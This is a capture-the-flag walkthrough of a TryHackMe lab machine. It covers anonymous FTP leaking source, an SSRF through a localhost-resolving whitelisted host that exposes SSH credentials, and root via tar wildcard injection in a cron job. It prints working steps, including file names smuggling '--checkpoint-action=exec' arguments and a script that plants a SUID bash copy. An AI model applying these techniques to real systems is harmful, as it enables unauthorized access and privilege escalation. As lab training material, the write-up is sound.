---
title: Operation Coldstart
date: 2026-11-04
difficulty: Easy
os: Linux
summary: Anonymous FTP leaks a source backup showing the URL preview's whitelist, an SSRF through kestrel.thm reads /admin/notes for SSH creds, and tar wildcard injection in a root cron job gives root.
room: https://tryhackme.com/room/operationcoldstart
---

## Recon

I started with an nmap scan, which revealed FTP on port 21, SSH on 22 and a web server on 80:

```bash
nmap -sC -sV -oN scans/basic.nmap cold.thm
```

![nmap scan](writeups/img/coldstart-1.png)

The webpage has a URL preview function, but it only allows webpages from a whitelist.

![URL Preview Service](writeups/img/coldstart-2.png)

## Foothold

The FTP server allowed anonymous login and stored a backup archive. By downloading and unpacking it, I got access to the server logic behind the preview function on the website and discovered that `http://kestrel.thm` is the only whitelisted entry:

![ALLOWED_HOSTS in the backup source](writeups/img/coldstart-3.png)

A preview request for it confirmed this:

![Preview of kestrel.thm](writeups/img/coldstart-4.png)

The code also contained interesting data accessible only to requests made from a 127.x IP. Since I knew that `kestrel.thm` resolves to `127.0.0.1` on the server through `/etc/hosts`, I could forge a request that would return the contents of `/admin/notes` to me:

```
http://kestrel.thm/admin/notes
```

It was a success, and the notes contained SSH credentials, so the initial foothold was gained through SSRF.

![SSH creds in /admin/notes](writeups/img/coldstart-5.png)

```bash
ssh webdev@<TARGET_IP>
# password: [redacted]
```

## Privilege escalation

### webdev → root

After connecting through SSH, I found the user flag in the home folder and started looking for privesc approaches. I found a backup cron job running as root under `/etc/cron.d/`, which ran the following:

```
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

![voltlabs-backup cron job](writeups/img/coldstart-6.png)

I researched it and found that, because of the wildcard in the command, we can control the arguments passed to `tar`. The trick here was to pass `--checkpoint=1 --checkpoint-action=exec=sh runme.sh`. This was achieved by adding files named as those arguments to the `/opt/backups` folder; since the current user owns it, this was easy to do. It works because of how unquoted wildcard expansion works: each file's name is put into the command as it is parsed. The payload contained a command for root to copy the `/bin/bash` executable to the `/tmp` folder and add the SUID bit, so we can run that bash while preserving root privileges.

```bash
#!/bin/bash

cd /opt/backups

echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > runme.sh

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh runme.sh"
```

![Wildcard injection payload](writeups/img/coldstart-7.png)

Once the cron job ran, I started the SUID bash and read the root flag:

```bash
/tmp/rootbash -p
```

## Flags

user.txt — THM{hidden}
root.txt — THM{hidden}
